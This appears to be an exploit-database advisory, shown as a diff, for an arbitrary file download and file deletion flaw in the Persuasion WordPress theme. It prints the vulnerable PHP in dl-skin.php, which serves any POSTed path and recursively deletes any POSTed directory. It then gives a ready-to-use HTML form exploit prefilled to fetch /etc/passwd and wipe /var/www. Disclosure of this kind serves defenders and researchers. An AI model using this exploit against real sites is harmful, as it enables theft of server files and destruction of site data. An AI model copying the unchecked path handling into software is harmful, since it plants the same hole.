@@ -1,0 +1,64 @@
+ Exploit Title: Persuasion Wordpress Theme - Arbitrary File Download and File Deletion Exploit
+ Date: 19 December 2013
+ Exploit Author: Interference Security
+ Vendor Homepage: http://mysitemyway.com/
+ Software Link: http://mysitemyway.com/theme/persuasion-wordpress-theme/
+ Version: Tested on 2.0 and 2.3
+
+Details:
+The vulnerable file is located at http://vulnerable-site.com/wp-content/themes/persuasion/lib/scripts/dl-skin.php
+In exploit code, file name in first text box should be readable on the vulnerable server, then the vulnerable code allows it to be downloaded from the server. And the second textbox accepts a directory path. If it is writeable then vulnerable code will delete its contents.
+An attacker can download readable files from the server and also can delete contents of writeable directories.
+
+
+Vulnerable code:
+<?php
+$file = $_POST['_mysite_download_skin'];
+
+if (file_exists($file)) {
+    header('Content-Description: File Transfer');
+    header('Content-Type: application/octet-stream');
+    header('Content-Disposition: attachment; filename='.basename($file));
+    header('Content-Transfer-Encoding: binary');
+    header('Expires: 0');
+    header('Cache-Control: must-revalidate, post-check=0, pre-check=0');
+    header('Pragma: public');
+    header('Content-Length: ' . filesize($file));
+    ob_clean();
+    flush();
+    readfile($file);
+
+    rrmdir($_POST['_mysite_delete_skin_zip']);
+    exit;
+}
+
+
+function rrmdir($dir) {
+  if (is_dir($dir)) {
+    $objects = scandir($dir);
+    foreach ($objects as $object) {
+      if ($object != "." && $object != "..") {
+        if (filetype($dir."/".$object) == "dir") rrmdir($dir."/".$object); else unlink($dir."/".$object);
+      }
+    }
+    reset($objects);
+    rmdir($dir);
+  }
+}
+
+?>
+
+Exploit Code:
+<html>
+<body>
+<form action="http://vulnerable-site.com/wp-content/themes/persuasion/lib/scripts/dl-skin.php" method="post">
+Existing file's name:<input type="text" name="_mysite_download_skin" value="/etc/passwd"><br>
+Directory to be removed:<input type="text" name="_mysite_delete_skin_zip" value="/var/www"><font color=red>Use with caution it will delete the files and directories if it is writeable</font><br>
+<input type="submit">
+</form>
+</body>
+</html>
+
+
+-- 
+Interference Security
